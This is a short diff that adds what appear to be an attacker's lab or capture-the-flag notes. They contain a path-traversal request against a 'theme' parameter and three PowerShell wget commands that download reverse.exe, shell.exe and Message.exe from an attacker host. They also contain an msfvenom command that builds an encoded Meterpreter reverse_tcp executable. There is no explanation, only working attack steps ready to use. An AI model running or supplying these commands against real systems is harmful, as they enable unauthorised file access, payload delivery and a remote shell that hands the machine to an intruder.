@@ -1,0 +1,11 @@
+
+<machine IP>/?theme=../../App_Data/files
+
+powershell.exe -c wget "http://<YOUR_IP>:8000/reverse.exe" -outfile "reverse.exe"
+
+powershell.exe -c wget "http://<YOUR_IP>:8000/shell.exe" -outfile "shell.exe"
+
+powershell.exe -c wget "http://<YOUR_IP>:8000/Message.exe" -outfile "Message.exe"
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe -o Message.exe
